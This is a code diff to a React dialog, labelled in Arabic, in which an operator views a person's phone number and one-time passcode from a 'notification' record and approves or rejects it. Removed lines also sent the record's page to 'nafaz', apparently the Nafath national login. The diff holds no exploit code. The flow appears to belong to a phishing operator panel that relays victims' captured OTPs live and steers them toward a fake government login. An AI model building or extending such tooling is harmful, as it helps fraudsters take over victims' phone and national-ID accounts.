@@ -21,8 +21,7 @@ interface PhoneDialogProps {
   phoneOtp?: string;
   notification: any;
   operator?: string;
-  handleApproval: (status: string, id: string) => Promise<void>;
-  handleUpdatePageName: (id: string, pagename: string) => Promise<void>;
+  handlePhoneOtpApproval: (status: string, id: string) => Promise<void>;
 }
 
 export default function PhoneDialog({
@@ -32,8 +31,7 @@ export default function PhoneDialog({
   phoneOtp,
   operator,
   notification,
-  handleUpdatePageName,
-  handleApproval,
+  handlePhoneOtpApproval,
 }: PhoneDialogProps) {
   const [phoneNumber, setPhoneNumber] = useState(notification?.phone2 || notification?.phone || "");
   const [otp, setOtp] = useState(phoneOtp || "");
@@ -117,7 +115,7 @@ export default function PhoneDialog({
                 <Input
                   id="otp"
                   readOnly
-                  value={notification?.phoneOtp ||"غير محدد"}
+                  value={notification?.phoneOtpCode || notification?.phoneOtp || "غير محدد"}
                   className="pr-10"
                   dir="ltr"
                 />
@@ -145,8 +143,7 @@ export default function PhoneDialog({
         <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
           <Button
             onClick={() =>{ 
-              handleUpdatePageName(notification.id,'nafaz')
-              handleApproval('approved',notification.id)
+              handlePhoneOtpApproval('approved',notification.id)
             }}
             disabled={isSubmitting}
             className="w-full bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white border-0 shadow-md"
@@ -154,7 +151,7 @@ export default function PhoneDialog({
             {isSubmitting ? "جاري الحفظ..." : "قبول البيانات"}
           </Button>
           <Button
-            onClick={() => handleUpdatePageName(notification.id,'verfiy-phone')}
+            onClick={() =>          handlePhoneOtpApproval('rejected',notification.id) }
             disabled={isSubmitting}
             className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-purple-700 text-white border-0 shadow-md"
           >
